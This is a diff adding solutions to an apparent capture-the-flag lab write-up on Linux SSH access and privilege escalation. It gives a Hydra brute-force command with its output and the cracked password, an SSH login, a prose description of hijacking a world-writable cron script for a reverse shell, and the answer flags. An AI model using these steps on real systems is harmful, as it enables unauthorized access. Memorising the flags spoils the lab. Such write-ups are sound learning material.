@@ -1136,14 +1136,56 @@ There is no supporting material - the only new concept in this challenge is Linu
 
 Q1: What port is SSH running on?
 **Hint: Use nmap to enumerate services on ports 4000 and 5000.**
-A:
+
+A: 4567
 
 Q2: Crack sam's password and read flag1.txt
 **Hint: Complete the challenge on day 17, to understand how to use Hydra.**
-A:
+
+A: THM{dec4389bc09669650f3479334532aeab}
+**Solution**
+So Here we know the username `sam` but we don't know the password for that user so we use hydra to brute force that user password if the password is weak we can easily crack that password. But we have to note `ssh` service is not running on default port so we have to specify port number with `-s` flag. And the final command are following:-
+
+```hydra
+$ hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.230.252 -t 4 ss  
+h -s 4567
+```
+
+Its output is like this 
+
+```hydra Output
+└──╼ $hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.230.252 -t 4 ss  
+h -s 4567  
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use i  
+n military or secret service organizations, or for illegal purposes (this is  
+non-binding, these *** ignore laws and ethics anyway).  
+  
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-30 22  
+:09:08  
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/  
+p:14344399), ~3586100 tries per task  
+[DATA] attacking ssh://10.10.230.252:4567/  
+[4567][ssh] host: 10.10.230.252 login: sam password: chocolate  
+1 of 1 target successfully completed, 1 valid password found  
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-30 22  
+:10:01
+```
+
+Here we got `sam` user password `chocolate`.
+
+Now connect to ssh using the following command
+
+```ssh
+$ ssh sam@10.10.230.252 -p 4567
+```
+
+Now you connect to the ssh and read the flag using command `cat flag1.txt`.
 
 Q3: Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
-A:
+
+A: THM{b27d33705f97ba2e1f444ec2da5f5f61}
+**Solution**
+So Now we got flag 1 but for getting flag 2 we have to do some privilege escalation stuff and from question we see we have to do this using cronjobs so to do that first i use the following command to see cronjobs for the system `cat /etc/crontabs` but there i did not get anything use full so i run `linpeas` for getting some privilege escalation vectors and i see there is also an other user on the system name `ubuntu` so i go there and see `flag2.txt` in there home directory but they are only read able by that user. But in home directory i see a directory name `scripts` and when i go there i see a bash script owned by `ubuntu` user and they are read and writeable to every one so i think that user set cronjob that script and when i see its content they are removing every thing from `/tmp` directory so i edit that script and enter a reverse shell command there so i got reverse shell and after one min i got the shell and now i can see the `flag2.txt`
 
 
 
